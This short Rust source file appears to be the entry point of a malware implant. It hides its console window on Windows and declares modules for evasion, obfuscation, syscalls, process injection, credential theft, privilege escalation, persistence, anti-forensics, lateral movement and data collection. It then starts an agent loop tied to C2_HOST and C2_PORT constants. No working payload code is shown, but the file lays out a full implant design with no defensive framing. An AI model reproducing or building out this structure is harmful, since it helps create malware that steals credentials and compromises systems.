#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod obfs;
mod task;
mod syscall;
mod inject;
mod loader;
mod fingerprint;
mod cred;
mod discovery;
mod privesc;
mod persist;
mod antifor;
mod collect;
mod lateral;
mod filemgr;
mod agent_loop;

pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};

fn main() {
    agent_loop::run();
}
